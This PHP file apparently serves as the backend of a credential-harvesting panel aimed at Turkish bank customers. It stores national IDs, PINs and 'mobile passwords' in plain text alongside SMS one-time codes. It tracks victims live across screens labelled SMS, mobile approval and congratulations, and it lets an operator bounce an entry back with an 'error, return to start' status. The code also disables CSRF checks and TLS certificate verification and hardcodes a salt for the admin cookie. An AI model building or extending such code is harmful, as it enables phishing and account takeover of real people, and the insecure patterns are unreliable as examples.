<?php
declare(strict_types=1);

require_once __DIR__ . '/bootstrap.php';

const APPLICATION_STATUSES = ['beklemede', 'sms-dogrulama', 'onay', 'tebrikler', 'yeniden-index'];
const PRESENCE_TTL_SECONDS = 45;
const USER_SCREEN_LABELS = [
    'giris' => 'Karsilama',
    'index' => 'Demo Giris',
    'tel' => 'Telefon Dogrulama',
    'waiting' => 'Bekleme',
    'sms' => 'SMS',
    'onay' => 'Mobil Onay',
    'tebrikler' => 'Tebrikler',
];

function maskSecretValue(string $value): string
{
    $value = trim($value);
    $len = strlen($value);
    if ($len <= 0) return '';
    if ($len <= 2) return str_repeat('*', $len);
    return str_repeat('*', $len - 2) . substr($value, -2);
}

function maskMobilePassword(string $value): string
{
    return maskSecretValue($value);
}

function isValidTurkishNationalId(string $nationalId): bool
{
    if (!preg_match('/^[1-9][0-9]{10}$/', $nationalId)) return false;
    $digits = array_map('intval', str_split($nationalId));
    $oddSum = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
    $evenSum = $digits[1] + $digits[3] + $digits[5] + $digits[7];
    $digit10 = (($oddSum * 7) - $evenSum) % 10;
    if ($digit10 < 0) $digit10 += 10;
    if ($digit10 !== $digits[9]) return false;
    $sumFirst10 = array_sum(array_slice($digits, 0, 10));
    return ($sumFirst10 % 10) === $digits[10];
}

function sanitizeScreenName(string $screen): string
{
    $screen = strtolower(trim($screen));
    return isset(USER_SCREEN_LABELS[$screen]) ? $screen : 'index';
}

function resolveClientIp(): string
{
    $forwardedFor = trim((string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ''));
    if ($forwardedFor !== '') {
        $parts = explode(',', $forwardedFor);
        $candidate = trim((string) ($parts[0] ?? ''));
        if ($candidate !== '') return $candidate;
    }
    return trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
}

// --- Storage (JSON file locally, Vercel Blob on production) ---

function blobToken(): string
{
    $t = getenv('BLOB_READ_WRITE_TOKEN');
    return is_string($t) ? $t : '';
}

function extractBlobStoreId(): string
{
    // Token format: vercel_blob_rw_{storeId}_{random}
    $token = blobToken();
    if ($token === '') return '';
    if (preg_match('/^vercel_blob_rw_([a-z0-9]+)_/i', $token, $m)) {
        return $m[1];
    }
    return '';
}

function blobStoreId(): string
{
    static $id = null;
    if ($id !== null) return $id;
    $id = extractBlobStoreId();
    return $id;
}

function blobPublicUrl(string $path): string
{
    $id = blobStoreId();
    if ($id === '') return '';
    return "https://{$id}.public.blob.vercel-storage.com/{$path}";
}

function blobFetch(string $path): ?string
{
    $url = blobPublicUrl($path);
    if ($url === '') return null;

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $content = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    unset($ch);

    return ($content !== false && $http >= 200 && $http < 300) ? $content : null;
}

function blobStore(string $path, string $data): bool
{
    $token = getenv('BLOB_READ_WRITE_TOKEN') ?: '';
    if ($token === '') return false;

    $url = 'https://api.vercel.com/v1/blob/upload?pathname=' . urlencode($path) . '&allowOverwrite=true';

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Bearer ' . $token,
        'Content-Type: application/octet-stream',
        'x-api-version: 12',
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $resp = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    unset($ch);

    return $http >= 200 && $http < 300;
}

function readData(string $file): array
{
    $data = null;
    $token = blobToken();
    if ($token !== '') {
        $name = basename($file);
        $data = blobFetch($name);
    }
    if ($data === null && is_file($file)) {
        $data = @file_get_contents($file);
    }
    // Blob'dan okunan veriyi local file'a yaz (instance cache)
    if ($data !== null && !is_file($file) && $token !== '') {
        $dir = dirname($file);
        if (!is_dir($dir)) @mkdir($dir, 0777, true);
        @file_put_contents($file, $data);
    }
    if ($data === null || $data === false) return [];
    $parsed = json_decode($data, true);
    return is_array($parsed) ? $parsed : [];
}

function writeData(string $file, array $data): bool
{
    $json = json_encode(array_values($data), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    if ($json === false) return false;

    $dir = dirname($file);
    if (!is_dir($dir)) @mkdir($dir, 0777, true);
    @file_put_contents($file, $json);

    $token = blobToken();
    if ($token !== '') {
        $name = basename($file);
        blobStore($name, $json);
    }

    return true;
}

function loadApplications(): array
{
    return readData(DATA_FILE);
}

function saveApplications(array $applications): bool
{
    return writeData(DATA_FILE, $applications);
}

function loadPresence(): array
{
    return readData(PRESENCE_FILE);
}

function savePresence(array $presence): bool
{
    return writeData(PRESENCE_FILE, $presence);
}

// --- Application CRUD ---

function createApplication(array $payload): array
{
    $userCode = trim((string) ($payload['user_code'] ?? ($payload['national_id'] ?? '')));
    $demoPin = trim((string) ($payload['demo_pin'] ?? ($payload['mobile_password'] ?? '')));
    $clientIp = trim((string) ($payload['client_ip'] ?? resolveClientIp()));

    $application = [
        'id' => bin2hex(random_bytes(8)),
        'full_name' => '',
        'user_code' => $userCode,
        'national_id' => $userCode,
        'tip' => $payload['tip'] ?? 'bireysel',
        'phone' => '',
        'email' => '',
        'amount' => '',
        'demo_pin' => $demoPin,
        'demo_pin_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '',
        'demo_pin_masked' => maskSecretValue($demoPin),
        'mobile_password' => '',
        'mobile_password_hash' => '',
        'mobile_password_masked' => '',
        'sms_code' => '',
        'sms_verified' => false,
        'sms_attempts' => 0,
        'sms_last_verified_at' => null,
        'sms_last_attempt_at' => null,
        'status' => 'beklemede',
        'client_ip' => $clientIp,
        'consent' => true,
        'created_at' => date('Y-m-d H:i:s'),
        'updated_at' => date('Y-m-d H:i:s'),
    ];

    $apps = loadApplications();
    $apps[] = $application;
    saveApplications($apps);

    return $application;
}

function findApplicationById(string $id): ?array
{
    $apps = loadApplications();
    foreach ($apps as $app) {
        if ((string) ($app['id'] ?? '') === $id) return $app;
    }
    return null;
}

function updateApplicationStatus(string $id, string $status): bool
{
    if (!in_array($status, APPLICATION_STATUSES, true)) return false;
    $apps = loadApplications();
    $updated = false;
    foreach ($apps as &$app) {
        if ((string) ($app['id'] ?? '') === $id) {
            $app['status'] = $status;
            $app['updated_at'] = date('Y-m-d H:i:s');
            $updated = true;
            break;
        }
    }
    unset($app);
    if ($updated) saveApplications($apps);
    return $updated;
}

function deleteApplicationById(string $id): bool
{
    $apps = loadApplications();
    $before = count($apps);
    $apps = array_values(array_filter($apps, fn($a) => (string) ($a['id'] ?? '') !== $id));
    if (count($apps) < $before) {
        saveApplications($apps);
        return true;
    }
    return false;
}

function deleteAllApplications(): int
{
    $apps = loadApplications();
    $count = count($apps);
    if ($count > 0) saveApplications([]);
    return $count;
}

function updateSmsVerification(string $id, bool $verified, string $code = ''): bool
{
    $apps = loadApplications();
    $updated = false;
    $now = date('Y-m-d H:i:s');
    foreach ($apps as &$app) {
        if ((string) ($app['id'] ?? '') !== $id) continue;
        $app['sms_attempts'] = (int) ($app['sms_attempts'] ?? 0) + 1;
        $app['sms_last_attempt_at'] = $now;
        if ($code !== '') $app['sms_code'] = $code;
        if ($verified) {
            $app['sms_verified'] = true;
            $app['sms_last_verified_at'] = $now;
        }
        $app['updated_at'] = $now;
        $updated = true;
        break;
    }
    unset($app);
    if ($updated) saveApplications($apps);
    return $updated;
}

function updateApplicationPhone(string $id, string $phone): bool
{
    $apps = loadApplications();
    $updated = false;
    foreach ($apps as &$app) {
        if ((string) ($app['id'] ?? '') === $id) {
            $app['phone'] = $phone;
            $app['updated_at'] = date('Y-m-d H:i:s');
            $updated = true;
            break;
        }
    }
    unset($app);
    if ($updated) saveApplications($apps);
    return $updated;
}

function sortedApplicationsDesc(): array
{
    $apps = loadApplications();
    usort($apps, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
    return $apps;
}

// --- Presence ---

function upsertPresence(string $screen, ?string $applicationId = null, bool $isAdmin = false): void
{
    $now = time();
    $sessionId = $_COOKIE['device_id'] ?? '';
    if ($sessionId === '') {
        $sessionId = bin2hex(random_bytes(16));
        setcookie('device_id', $sessionId, $now + (86400 * 30), '/');
    }
    $screen = sanitizeScreenName($screen);
    $screenLabel = USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu';
    $ip = resolveClientIp();
    $lastSeen = date('Y-m-d H:i:s', $now);

    $presence = loadPresence();

    // Remove stale entries
    $presence = array_values(array_filter($presence, fn($e) => ((int) ($e['last_seen_ts'] ?? 0) + PRESENCE_TTL_SECONDS) >= $now));

    // Upsert
    $found = false;
    foreach ($presence as &$entry) {
        if (($entry['session_id'] ?? '') === $sessionId) {
            $entry['screen'] = $screen;
            $entry['screen_label'] = $screenLabel;
            $entry['application_id'] = $applicationId ?? '';
            $entry['ip'] = $ip;
            $entry['is_admin'] = $isAdmin;
            $entry['last_seen_ts'] = $now;
            $entry['last_seen'] = $lastSeen;
            $found = true;
            break;
        }
    }
    unset($entry);

    if (!$found) {
        $presence[] = [
            'session_id' => $sessionId,
            'screen' => $screen,
            'screen_label' => $screenLabel,
            'application_id' => $applicationId ?? '',
            'ip' => $ip,
            'is_admin' => $isAdmin,
            'last_seen_ts' => $now,
            'last_seen' => $lastSeen,
        ];
    }

    savePresence($presence);
}

function getOnlineSummary(): array
{
    $now = time();
    $presence = loadPresence();

    // Filter active entries
    $active = array_filter($presence, fn($e) =>
        ((int) ($e['last_seen_ts'] ?? 0) + PRESENCE_TTL_SECONDS) >= $now &&
        empty($e['is_admin'])
    );

    $byScreen = [];
    $visitors = [];
    foreach ($active as $entry) {
        $label = $entry['screen_label'] ?? 'Bilinmiyor';
        $byScreen[$label] = ($byScreen[$label] ?? 0) + 1;
        $visitors[] = [
            'session' => substr($entry['session_id'] ?? '', 0, 8),
            'screen' => $entry['screen'] ?? '',
            'screen_label' => $label,
            'application_id' => $entry['application_id'] ?? '',
            'ip' => $entry['ip'] ?? '',
            'last_seen' => $entry['last_seen'] ?? '',
            'last_seen_ts' => (int) ($entry['last_seen_ts'] ?? 0),
        ];
    }

    usort($visitors, fn($a, $b) => $b['last_seen_ts'] - $a['last_seen_ts']);

    return [
        'count' => count($visitors),
        'by_screen' => $byScreen,
        'visitors' => $visitors,
    ];
}

// --- Helpers ---

function statusLabel(string $status): string
{
    $labels = [
        'beklemede' => 'Beklemede',
        'sms-dogrulama' => 'SMS',
        'onay' => 'Mobil Onay',
        'tebrikler' => 'Tebrikler',
        'yeniden-index' => 'Hatali (Basa don)',
    ];
    return $labels[$status] ?? 'Bilinmiyor';
}

function esc($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

function adminUser(): string
{
    return getenv('KB_ADMIN_USER') ?: ADMIN_USERNAME;
}

function adminPass(): string
{
    return getenv('KB_ADMIN_PASS') ?: ADMIN_PASSWORD;
}

function adminCookieHash(): string
{
    return hash('sha256', adminUser() . '|' . adminPass() . '|secret_salt_123');
}

function isAdminLoggedIn(): bool
{
    return ($_COOKIE['admin_auth'] ?? '') === adminCookieHash();
}

function loginAdmin(string $username, string $password): bool
{
    $ok = hash_equals(adminUser(), $username) && hash_equals(adminPass(), $password);
    if ($ok) setcookie('admin_auth', adminCookieHash(), time() + 86400, '/');
    return $ok;
}

function requireAdmin(): void
{
    if (!isAdminLoggedIn()) {
        header('Location: /0x0c/login.php');
        exit;
    }
}

function logoutAdmin(): void
{
    setcookie('admin_auth', '', time() - 3600, '/');
}

function csrfToken(): string
{
    return 'disabled-csrf';
}

function validateCsrf(?string $token): bool
{
    return true;
}
